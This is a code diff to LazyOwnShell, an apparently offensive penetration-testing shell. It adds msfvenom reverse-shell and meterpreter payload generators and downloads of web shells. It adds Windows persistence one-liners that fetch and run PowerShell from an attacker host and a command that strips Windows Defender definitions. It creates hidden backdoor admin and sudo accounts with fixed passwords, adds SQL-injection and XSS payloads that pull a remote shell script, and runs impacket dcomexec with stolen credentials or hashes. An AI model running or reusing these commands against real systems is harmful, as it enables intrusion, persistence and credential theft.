@@ -212,6 +212,7 @@ class LazyOwnShell(cmd2.Cmd):
         "pwnat": "sh pwnat -s 8080",
         "q": "exit",
         "rtpflood" : "sh sudo bash modules/lazyrtpflood.sh",
+        "t": "sh python3 modules/lazypyautogui.py",
         "tor": "sh sudo bash sessions/tor.sh",
         "ses": "sh ls sessions",
         "sniff": "run lazysniff",
@@ -1905,7 +1906,13 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg("19: windows/shell_reverse_tcp python shellcode")
         print_msg("20: windows/x64/shell_reverse_tcp msi")
         print_msg("21: windows/meterpreter/reverse_tcp Powershell")
-        choice = input("Enter your choice (1-21): ").strip()
+        print_msg("22: windows/meterpreter/reverse_tcp enc dll")
+        print_msg("23: windows/shell_reverse_tcp HTA file")
+        print_msg("24: windows/shell_reverse_tcp CSharp Shellcode")
+        print_msg("25: windows/shell_reverse_tcp Perl Shellcode Windows")
+        print_msg("26: linux/x64/shell_reverse_tcp Perl Shellcode Linux")
+        print_msg("27: linux/x64/shell_reverse_tcp python shellcode")
+        choice = input("Enter your choice (1-27): ").strip()
 
         # Define payload commands
         commands = {
@@ -1923,7 +1930,7 @@ class LazyOwnShell(cmd2.Cmd):
             "12": f'msfvenom -p osx/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho',
             "13": (
                 f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} '
-                '-b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > payload.c'
+                '-b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > sessions/payload.c'
             ),
             "14": (
                 f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -x sessions/shell.exe -e x86/shikata_ga_nai -a x86 --platform windows -i 33 -k -f exe > shell_encoded.exe'
@@ -1937,13 +1944,31 @@ class LazyOwnShell(cmd2.Cmd):
                 "msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll"
             ),
             "19": (
-                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/run.py'
+                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/shellcode_windows.py'
             ),
             "20": (
                 f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f msi > sessions/shell64.msi'
             ),
             "21": (
                 f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f psh > sessions/Shell.ps1'
+            ),
+            "22": (
+                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT="{lport}" --encrypt rc4 --encrypt-key thisisakey -f dll > sessions/Shell.dll'
+            ),
+            "23": (
+                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f hta-psh > sessions/index.hta'
+            ),
+            "24": (
+                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f csharp > sessions/shellcode.cs'
+            ),
+            "25": (
+                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f perl > sessions/shellcode_windows.pl'
+            ),
+            "26": (
+                f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f perl > sessions/shellcode_linux.pl'
+            ),
+            "27": (
+                f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/shellcode_linux.py'
             )
         }
         if choice in commands:
@@ -1994,7 +2019,7 @@ class LazyOwnShell(cmd2.Cmd):
                 if os.path.exists("sessions/shell64.macho"):
                     os.system("upx sessions/shell64.macho")
             if choice == "13":
-                if os.path.exists("payload.c"):
+                if os.path.exists("sessions/payload.c"):
                     print_msg("Payload in C generated: payload.c")
                     os.system(
                         f"echo 'curl http://{lhost}/payload.c -o payload.c' | xclip -sel clip"
@@ -2004,7 +2029,7 @@ class LazyOwnShell(cmd2.Cmd):
                     )
 
         else:
-            print_error("Invalid choice. Please select a number between 1 and 15.")
+            print_error("Invalid choice. Please select a number between 1 and 26.")
 
     def run_lazyaslrcheck(self):
         """
@@ -3196,6 +3221,7 @@ class LazyOwnShell(cmd2.Cmd):
         packetstormsecurity(getnvd)
         os.system(f"msfconsole -q -x \"search {line}; exit\"")
         line = line.replace(" ","+")
+        self.onecmd(f"creds_py '{line}'")
         print_msg(f"To open use Ctrl + Click: {BLUE}{UNDERLINE}https://sploitus.com/?query={line}#exploits")
         return
 
@@ -4224,12 +4250,16 @@ class LazyOwnShell(cmd2.Cmd):
             - Ensure that the `lazycreate_webshell.py` script is correctly configured and accessible.
             - Verify the URL in the `wget` command to ensure it points to a valid and safe web shell.
         """
-
+        path = os.getcwd()
+        sessions = f"{path}/sessions"
         print_msg("Creando la shell disfrazada de jpg")
         os.system("python3 modules/lazycreate_webshell.py")
         os.system(
             "cd sessions && wget https://github.com/flozz/p0wny-shell/raw/master/shell.php"
         )
+        wget2 = f"wget -P {sessions} https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp"
+        print_msg(wget2)
+        os.system(wget2)        
         return
 
     def do_createrevshell(self, line):
@@ -4294,7 +4324,6 @@ class LazyOwnShell(cmd2.Cmd):
         edit = f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> {sessions}/Invoke-PowerShellTcp.ps1"
         print_msg(edit)
         os.system(edit)
-        
         with open(file_rev, 'r') as f:
             rev_content = f.read()
 
@@ -5210,7 +5239,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         # Payload 3
         secondary_payload = (
-            f"<img src=\"1\" onerror=\"this.remove(); var s=document.createElement('script'); s.src='http://{lhost}/scripts.js'; document.body.appendChild(s);\">"
+            f"<img src=\"1\" onerror=\"this.remove(); var s=document.createElement('script'); s.src='http://{lhost}/script.js'; document.body.appendChild(s);\">"
         )
 
         # Inform user and ask for selection
@@ -5557,7 +5586,19 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
             ("WIN ARP Table", "arp -a"),
+            ("WIN PowerView.ps1", "powershell-import PowerView.ps1 ; powershell Get-domain"),
+            ("WIN Sharp Persist", f"SharPersist.exe -t reg -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden IEX ((new-object net.webclient).downloadstring('http://{lhost}/ps.ps1'))\" -k \"hkcurun\" -v \"b0x\" -m add"),
+            ("WIN Persist manual", f"REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  /t REG_SZ  /v box2 /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden IEX ((new-object net.webclient).downloadstring('http://{lhost}/ps.ps1'))\""),
+            ("WIN Cheks if a VM", 'reg query HKLM\SYSTEM /s | findstr /S "VirtualBox VBOX VMWare"'),
+            ("WIN Unquoted service paths", 'Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike \'"*\'} | select PathName,DisplayName,Name'),
+            ("WIN DNS records enum", f'Get-DnsRecord -RecordType A -ZoneName FQDN -Server {domain}'),
+            ("WIN Find bookmarks",'type "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"'),
+            ("WIN Proxy Aware PS", '$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("<url>")'),
+            ("WIN wmic exec",f'wmic.exe /node:{lhost} /user:username /password:pass process call create cmd.exe /c " command "'),
+            ("WIN AV Cripple", '"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All'),
+            ("WIN multiple RDP", 'reg add HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPerUser /d 0 /f'),
             ("WIN Reg Query Uninstall", "cmd /c REG QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
+            ("WIN Reg hidde grisun0 local admin", "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /t REG_DWORD /v grisun0 /d 0 /f"),
             ("WIN Enum AV folder protected","& \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -Scan -ScanType 3 -File \"C:\\folder_to_check\|*\""),
             ("WIN Force Install", "Set __COMPAT_LAYER=RunAsInvoker ; Start Shell64.exe"),
             ("WIN IP Configuration", "ipconfig /all"),
@@ -5585,6 +5626,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN ADSync Property","Get-ItemProperty -Path \"C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe\" | Format-list -Property * -Force"),
             ("WIN ADSync Sql",f"sqlcmd -S {subdomain} -Q \"use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration\""),
             ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
+            ("WEB Google site:linkedin.com/in \"Company Name\"", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ console.log(employees[0][i].innerHTML) }'),
             ("WEB Cady", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"ping%3b\"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b"),
             ("WEB Cady yummy", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"curl+{lhost}/revshell.sh+|bash%3b\"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b ")
 
@@ -6102,15 +6144,16 @@ class LazyOwnShell(cmd2.Cmd):
 
         Note: Ensure `xclip` is installed on your system for copying to the clipboard. If `xclip` is not available, you may need to install it or use an alternative method for copying to the clipboard.
         """
-
+        rhost = self.params["rhost"]
         tcp_cmd = """echo "TCP Ports:"; \
         awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/tcp; \
         echo "UDP Ports:"; \
         awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/udp
         """
-
+        
         print_msg(f"{GREEN} {tcp_cmd} {RESET}")
-
+        command = "0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(<tgt_ip>,$_)) \"Port $_ open\"} 2>$null".replace("<tgt_ip>",rhost)
+        print_msg(f"Windows usage: {command}")
         try:
             process = subprocess.Popen(
                 ["xclip", "-sel", "clip"], stdin=subprocess.PIPE, text=True
@@ -7846,8 +7889,8 @@ class LazyOwnShell(cmd2.Cmd):
         Note: Ensure `xclip` is installed and available on your system.
         """
 
-        print_msg(f"{WHITE}useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0{RESET} ")
-        os.system(f"printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0\" | xclip -sel clip")
+        print_msg(f"printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0\" | xclip -sel clip")
+        os.system(f"printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0\" | xclip -sel clip")
         print_warn("Copied to clip ;)")
         return
 
@@ -9590,13 +9633,18 @@ class LazyOwnShell(cmd2.Cmd):
             - The server command is executed using `os.system`, which may require additional handling for security.
         """
         lhost = self.params["lhost"]
-        lport = self.params["lport"]
+        lport = self.params["reverse_shell_port"]
         path = os.getcwd()
         file = f"{path}/modules/run"
         wfile = f"{path}/sessions/win/lazybot.ps1"
         bfile = f"{path}/modules/run.bat"
         filek = f"{path}/modules/backdoor/backdoor.c"
         files = f"{path}/modules/backdoor/server.c"
+
+        random_bytes = os.urandom(100)
+        base64_encoded = base64.b64encode(random_bytes)
+        random_string = base64_encoded.decode('utf-8')[:12] 
+
         if not check_lhost(lhost):
             return
 
@@ -9655,7 +9703,7 @@ class LazyOwnShell(cmd2.Cmd):
         with open("sessions/server.c", 'w+') as f:
             f.write(content)
 
-        choice = input(f"    {CYAN}[?] start C2 Server ? (yes/no): ")
+        choice = input(f"    {CYAN}[?] start C2 Server ? (yes/no): ") or 'yes'
         if choice == 'yes':
             command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
             os.system(command)
@@ -10117,16 +10165,17 @@ class LazyOwnShell(cmd2.Cmd):
                 return
         domain = get_domain(rhost)
         output_file = f"sessions/{domain}_nuclei_output.txt"
-        choice = input("    [?] do you want use extra templates path: (y/n)") or 'y'
+        choice = input("    [?] do you want use extra templates path: (y/n) ") or 'y'
         if choice == 'y':
-            install = input("    [?] do you want clone extra templates repo: (y/n)") or 'y'
+            install = input("    [?] do you want clone extra templates repo: (y/n) ") or 'y'
             if install == 'y':
                 os.system("cd .. && git clone https://github.com/projectdiscovery/nuclei-templates.git 2>/dev/null")
-            path = input("    [!] Enter the path to templates: (default: ../nuclei-templates)") or '../nuclei-templates'
+            path = input("    [!] Enter the path to templates (default ../nuclei-templates): ") or '../nuclei-templates'
             cmd = ["nuclei", "-t", path, "-u", rhost, "-o", output_file, '-tags', 'cve']
         else:        
             cmd = ["nuclei", "-u", rhost, "-o", output_file, '-tags', 'cve']
         try:
+            print_msg(cmd)
             subprocess.run(cmd, check=True)
             os.system(f"cat {output_file}")
         except subprocess.CalledProcessError as e:
@@ -12199,7 +12248,7 @@ class LazyOwnShell(cmd2.Cmd):
                 eyewitness_command += f" --timeout {timeout}"
 
             
-            output_dir = input("    [!] Enter output directory name: (default: sessions)").strip() or "sessions"
+            output_dir = input("    [!] Enter output directory name: (default: sessions/eye)").strip() or "sessions/eye"
             eyewitness_command += f" -d {output_dir}"
             eyewitness_command += f" --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'"
             eyewitness_command += " --show-selenium"
@@ -19435,6 +19484,37 @@ class LazyOwnShell(cmd2.Cmd):
         """
         rhost = self.params["rhost"]
         url = f'http://{rhost}'
+        
+        smuggled_request = (
+            "POST / HTTP/1.1\r\n"
+            "Host: {}\r\n"
+            "Content-Length: 0\r\n"
+            "Transfer-Encoding: chunked\r\n"
+            "\r\n"
+            "0\r\n\r\n"
+            "GET /admin HTTP/1.1\r\n"
+            "Host: {}\r\n"
+            "User-Agent: smuggle-test\r\n"
+            "\r\n"
+        ).format(url, url)
+
+        try:
+            response = requests.post(url, data=smuggled_request, headers={'Content-Type': 'text/plain'}, timeout=10)
+            
+            if response.status_code == 200 and "admin" in response.text:
+                print_msg(f"目標 {url} 可能存在 CVE-2024-40725 漏洞")
+            else:
+                print_msg(f"目標 {url} 不存在 CVE-2024-40725 漏洞")
+        except Exception as e:
+            print_error(f"檢測過程中出錯: {e}")
+            
+        payload = "4\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n0\r\n4\r\n"
+        headers = {
+        'Content-Type': 'multipart/form-data; boundary=4'
+        }
+        response = requests.request("POST", url, headers=headers, data=payload)
+
+        print_msg(response.text)        
         payload = (
             "<img src=x onerror=\"fetch('/api/update_role', {method: 'POST', headers: { 'Content-Type': 'application/json'}, "
             "body: JSON.stringify({ 'username': 'grisun0', 'role': 'grisun0'})})\" />"
@@ -19461,12 +19541,7 @@ class LazyOwnShell(cmd2.Cmd):
                 "Content-Type": "application/json",
                 "token": jwt_secret["Authorization"],
             }
- #           payload = {
-  #              "jsonrpc": "2.0",
-   #             "method": f"{line}",
-    #            "params": ["0x1", True],
-     #           "id": 1
-      #      }0x75e41404c8c1de0c2ec801f06fbf5ace8662240f
+
             payload = {
                 "jsonrpc": "2.0",
                 "method": "eth_getLogs",
@@ -19476,6 +19551,748 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(payload)
             response = s.post(url, headers=headers, json=payload)
             print_msg(response.json())
+
+    def do_utf(self, line):
+        """
+        Encode a given payload into UTF-16 escape sequences.
+
+        This function takes a payload string and encodes each character into its
+        UTF-16 hexadecimal representation (e.g., `A` becomes `\u0041`). If no
+        payload is provided as input, it prompts the user to input one, with a
+        default value of `' or 1=1-- -`.
+
+        Parameters:
+            line (str): The input payload to encode. If empty, the user is prompted
+            to provide one interactively.
+
+        Returns:
+            None: The encoded payload is printed to the console.
+        """
+
+        parser = cmd2.Cmd2ArgumentParser()
+        parser.add_argument('payload', nargs='?', default="' or 1=1-- -", help="The payload to encode (default: ' or 1=1-- -), more help, use help utf")
+
+        try:
+            args = parser.parse_args(line.split())
+            payload = args.payload
+
+            if payload == "' or 1=1-- -":
+                payload = input(f"    [!] Enter the payload to encode (default '{payload}'): ").strip() or payload
+
+            utf = []
+            for i in payload:
+                utf.append("\\u00" + hex(ord(i)).split('x')[1])
+                time.sleep(0.08)
+                os.system("clear")
+                print_msg(''.join([i for i in utf]))
+
+        except SystemExit:  
+            print_error("Invalid arguments provided. Use '-h' for help. or help utf")
+            return
+    
+    def do_dcomexec(self, line):
+        """
+        Executes the Impacket dcomexec tool to run commands on a remote system using DCOM.
+
+        This function performs the following actions:
+        1. Validates the target host (rhost) and domain parameters.
+        2. If the line argument is "pass", it searches for credential files with the pattern `credentials*.txt`,
+        allows the user to select credentials, and constructs the dcomexec command using them.
+        3. If the line argument is "hash", it searches for a hash file, prompts the user for a username, and
+        constructs the dcomexec command using the hash.
+        4. If line does not match "pass" or "hash", it displays an error message with usage instructions.
+
+        Parameters:
+        line (str): A command argument to determine the authentication mode.
+                    If "pass", the function searches for credential files and authenticates using the selected file.
+                    If "hash", it uses a hash file for authentication.
+                    If neither, it prints an error message with usage instructions.
+
+        Returns:
+        None
+        """
+
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        domain = self.params["domain"]
+        path = os.getcwd()
+        if not is_binary_present("impacket-dcomexec"):
+            print_warn("impacket-dcomexec is not installed. Installing.")
+            os.system("sudo apt install impacket -y")
+            return
+        if not check_rhost(rhost):
+            return
+        self.onecmd('createrevshell')
+        if line == "pass":
+            credentials = get_credentials()
+            if not credentials:
+                return
+            for user, passwd in credentials:
+                command = (
+                    f"impacket-dcomexec -object MMC20 -silentcommand -debug "
+                    f"{domain}/{user}:{passwd}@{rhost} 'powershell.exe Invoke-WebRequest "
+                    f"-Uri http://{lhost}/Invoke-PowerShellTcp.ps1 -OutFile C:\\Windows\\TEMP\\Invoke-PowerShellTcp.ps1'"
+                )
+                print_msg(command)
+                os.system(command)
+            return
+
+        elif line == "hash":
+            hash_value = get_hash()
+            if not hash_value:
+                return
+            if ":" in hash_value:
+                hashis = f"-hashes {hash_value}"
+            else:
+                hashis = f"-hashes :{hash_value}"
+            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
+            command = (
+                f"impacket-dcomexec -object MMC20 -silentcommand -debug "
+                f"{hashis} {domain}/{user}@{rhost} 'powershell.exe Invoke-WebRequest "
+                f"-Uri http://{lhost}/Invoke-PowerShellTcp.ps1 -OutFile C:\\Windows\\TEMP\\Invoke-PowerShellTcp.ps1'"
+            )
+            print_msg(command)
+            os.system(command)
+            return
+
+        else:
+            print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
+            return
+
+    def do_pip_repo(self, line):
+        """
+        Sets up a local pip repository and serves it via an HTTP server for offline installations.
+
+        This function performs the following actions:
+        1. Creates a directory for storing pip packages if it does not already exist.
+        2. Downloads a predefined list of Python packages along with their dependencies to the repository directory.
+        3. Organizes the downloaded packages into their respective directories.
+        4. Starts an HTTP server to host the repository, allowing remote machines to install the packages.
+
+        The repository path is created under the `sessions` directory, and the packages are served using Python's
+        built-in HTTP server at port 8008.
+
+        Parameters:
+        line (str): Optional argument for the command. Not used in this implementation but retained for compatibility
+                    with the cmd2 framework.
+
+        Returns:
+        None
+        """
+
+        path = os.getcwd()
+        sessions = f"{path}/sessions"
+        repo = f"{sessions}/pip-repo"
+        simple = f"{repo}/simple"
+        lhost = self.params["lhost"]
+        port = 8008
+        os.makedirs(repo, exist_ok=True)
+
+        packages = [
+            "requests", "python-libnmap", "pwncat-cs", "pwn", "groq", "PyPDF2", "docx", "python-docx", "olefile",
+            "exifread", "pycryptodome", "impacket", "pandas", "colorama", "tabulate", "pyarrow", "keyboard",
+            "flask-unsign", "name-that-hash", "certipy-ad", "ast", "pykeepass", "cmd2", "Pillow", "netaddr", "stix2"
+        ]
+
+        for package in packages:
+            command = f"pip download {package} -d {repo}"
+            print_msg(command)
+            os.system(command)
+
+        generate_index(repo)
+
+        os.chdir(repo)
+        print_msg(f"Serving pip repository from {repo} at {port}")
+        print_warn("At the target you can use this ~/.pip/pip.conf:")
+        print_msg(f"""
+        [global]
+        index-url = http://{lhost}:{port}
+        trusted-host = {lhost}
+        """.replace("    ", ""))
+        print_warn("Or you can use this one: ")
+        print_msg(f"pip install <package_name> --index-url http://{lhost}:{port} --trusted-host {lhost}")
+        server = f"cd {simple} && python3 -m http.server {port}"
+        print_msg(server)
+        os.system(server)
+        print_warn(f"Shutdown the server at {port}")
+        return
+
+    def do_apt_repo(self, line):
+        """
+        Creates a local APT repository and serves it via a web server.
+
+        This function performs the following actions:
+        1. Creates a directory for storing `.deb` packages.
+        2. Downloads the specified APT packages and their dependencies into the repository.
+        3. Generates the necessary APT repository indexes.
+        4. Starts a web server to host the repository for remote clients.
+
+        Parameters:
+        line (str): A space-separated list of package names to include in the repository.
+
+        Returns:
+        None
+        """
+
+        parser = cmd2.Cmd2ArgumentParser()
+        parser.add_argument('packages', nargs='*', help="List of packages to include in the repository.")
+
+        try:
+            args = parser.parse_args(line.split())
+            packages = args.packages
+
+            if not packages:
+                print_error("No packages specified. Please provide a list of packages to include in the repository.")
+                return
+
+            lhost = self.params["lhost"]
+            path = os.getcwd()
+            sessions = f"{path}/sessions"
+            repo = f"{sessions}/apt-repo"
+            os.makedirs(repo, exist_ok=True)
+
+            print_msg("Downloading packages and their dependencies...")
+            for package in packages:
+                command = f"apt-get download {package}"
+                print_msg(command)
+                subprocess.run(command, shell=True, check=True)
+
+                command = f"apt-cache depends {package} | grep 'Depends:' | awk '{{print $2}}'"
+                print_msg(command)
+                dependencies = subprocess.check_output(command, shell=True, text=True).splitlines()
+
+                for dependency in dependencies:
+                    command = f"apt-get download {dependency}"
+                    print_msg(command)
+                    subprocess.run(command, shell=True, check=True)
+
+            print_msg("Generating APT repository index...")
+            command = f"dpkg-scanpackages {repo} /dev/null | gzip -9c > {repo}/Packages.gz"
+            print_msg(command)
+            subprocess.run(command, shell=True, check=True)
+
+            # Generate the Release file
+            release_content = f"""Origin: Local Repository
+            Label: Local Repository
+            Suite: stable
+            Codename: local
+            Version: 1.0
+            Architectures: amd64
+            Components: main
+            Description: Local APT repository
+            """.replace('            ','')
+            with open(f"{repo}/Release", "w") as release_file:
+                release_file.write(release_content)
+
+            # Generate the InRelease file
+            command = f"gpg --batch --yes --output {repo}/InRelease --clearsign {repo}/Release"
+            print_msg(command)
+            subprocess.run(command, shell=True, check=True)
+
+            # Generate the Release.gpg file
+            command = f"gpg --batch --yes --output {repo}/Release.gpg --detach-sign -a {repo}/Release"
+            print_msg(command)
+            subprocess.run(command, shell=True, check=True)
+
+            print_msg("Starting web server to serve the APT repository...")
+            command = f"echo \"deb [trusted=yes] http://{lhost}:8009 ./\" | sudo tee /etc/apt/sources.list.d/localrepo.list && sudo apt update"
+            copy2clip(command)
+            subprocess.run(f"python3 -m http.server 8009 --directory {repo}", shell=True, check=True)
+
+        except subprocess.CalledProcessError as e:
+            print_error(f"Command failed: {e.cmd}")
+            print_error(f"Output: {e.output}")
+            print_error(f"Return code: {e.returncode}")
+        except SystemExit:
+            print_error("Invalid arguments provided. Use '-h' for help. or help apt_repo")
+            return
+            
+    def do_httprobe(self, line):
+        """
+        Executes the httprobe tool to probe domains for working HTTP and HTTPS servers.
+
+        This function performs the following actions:
+        1. Verifies if httprobe is installed; if not, it installs the tool automatically.
+        2. Probes domains from the input file or standard input.
+        3. Simplifies the user experience by minimizing required commands and leveraging self.params for defaults.
+
+        Parameters:
+        line (str): Optional command arguments specifying the domain or just httprobe.
+                    Example usage:
+                    just provide the domain: httprobe example.com
+
+        Returns:
+        None
+        """
+
+        httprobe_binary = "httprobe"
+        domain = self.params["domain"]
+        install_command = "go install github.com/tomnomnom/httprobe@latest"
+        if not os.path.exists(os.path.expanduser("~/go/bin/httprobe")):
+            os.system(install_command)
+
+        input_file = get_users_dic('txt')
+        http = input("    [!] Enter the http port default 80: ") or '80'
+        https = input("    [!] Enter the https port default 443: ") or '443'
+        concurrency = input("    [!] Enter the concurrency level default 50: ") or '50'
+        timeout = input("    [!] Enter the Timeout in milisecs default 20000: ") or '20000'
+        additional_params = f" -p http:{http} -p https:{https} -c {concurrency} -t {timeout}"
+        if line:
+            command = f"echo \"{line.strip()}\" | {httprobe_binary} {additional_params}"
+        else:
+            if input_file is not None:
+                command = f"cat {input_file} | {httprobe_binary} {additional_params}"
+            else:
+                command = f"echo \"{domain}\" | {httprobe_binary} {additional_params}"
+        print_msg(command)
+        os.system(command)
+        return
+
+    def do_eyewitness_py(self, line):
+        """
+        Automates EyeWitness installation and execution without requiring user input.
+        
+        This function installs EyeWitness if it is not already available, uses a default input file 
+        (`urls.txt`), and applies standard configurations to execute a web enumeration task 
+        automatically. No arguments or manual intervention are needed from the user.
+
+        Behavior:
+            - Installs EyeWitness if missing.
+            - Uses `urls.txt` as the default input file.
+            - Sets a default timeout of 60 seconds.
+            - Automatically executes EyeWitness with predefined settings.
+
+        Usage:
+            witness
+        """
+        try:
+            path = os.getcwd()
+            eyewitness_repo = "https://github.com/FortyNorthSecurity/EyeWitness.git"
+            eyewitness_path = os.path.join("external", ".exploit", "EyeWitness")
+            eyewitness_path = path + "/" + eyewitness_path
+            default_timeout = 60
+            path = os.getcwd()
+            domain = self.params["domain"]
+            if not os.path.exists(eyewitness_path):
+                print_warn("EyeWitness not found. Installing...")
+                os.makedirs(eyewitness_path, exist_ok=True)
+                os.system(f"git clone {eyewitness_repo} {eyewitness_path}")
+                os.system(f"cd {eyewitness_path}/Python/setup && sudo ./setup.sh && pip install selenium && pip install pyvirtualdisplay")
+                print_msg("EyeWitness installed successfully.")
+
+            input_file = get_users_dic("txt")
+
+            if input_file is None:
+                input_file = f"{path}/sessions/domain_{domain}.txt"
+                command = f"echo \"{domain}\" > {input_file}"
+                print_msg("Crafting file domain: " + command)
+                os.system(command)
+
+            command = f"cd {eyewitness_path}/Python && python3 {eyewitness_path}/Python/EyeWitness.py -f {input_file} --web --timeout {default_timeout}"
+            print_msg(f"Executing EyeWitness with command: {command}")
+            os.system(command)
+
+        except Exception as e:
+            print_error(f"Error: {e}")
+
+    def do_pup(self, line):
+        """
+        Processes HTML content from a specified URL using the pup utility and a default CSS selector.
+
+        This function:
+            - Retrieves HTML content from the URL stored in `self.params["url"]` using curl.
+            - Filters the HTML content using the pup utility with a predefined CSS selector.
+            - Displays the filtered result in the terminal.
+
+        Behavior:
+            - Requires `pup` to be installed.
+            - Uses `self.params["url"]` as the source URL.
+            - Applies the CSS selector 'table table tr:nth-last-of-type(n+2) td.title a' by default.
+
+        Usage:
+            pup
+        """
+        path = os.getcwd()
+        pup_repo = "https://github.com/ericchiang/pup.git"
+        pup_path = os.path.join("external", ".exploit", "pup")
+        pup_path = path + "/" + pup_path        
+        try:
+            if not is_binary_present("pup"):
+                print_error("pup is not installed. Installing ''")
+                print_msg(pup_repo)
+                os.system(f"git clone {pup_repo} {pup_path}")
+                command = f"cd {pup_path} && go get github.com/ericchiang/pup && go build && go install"
+                print_msg(command)
+                os.system(command)
+                
+
+            url = self.params.get("url")
+            if not url:
+                print_error("URL not defined in self.params['url']. use assing url http://url.com")
+                url = input("    [!] Enter the url to pup: ")
+
+            default_selector = "table table tr:nth-last-of-type(n+2) td.title a"
+            default_selector = input(f"    [!] Enter the default selector {default_selector}: ") or default_selector
+            command = f"curl -s {url} | pup '{default_selector}'"
+            print_msg(f"Executing: {command}")
+            os.system(command)
+
+        except Exception as e:
+            print_error(f"Error: {e}")
+        return
+    
+    def do_recon(self, line):
+        """
+        Performs reconnaissance on a specified domain using crt.sh (the target must be visible on internet), pup, httprobe, and EyeWitness.
+
+        This function automates the process of gathering subdomains for a given domain, verifying 
+        their reachability, and generating a report using the EyeWitness tool. 
+
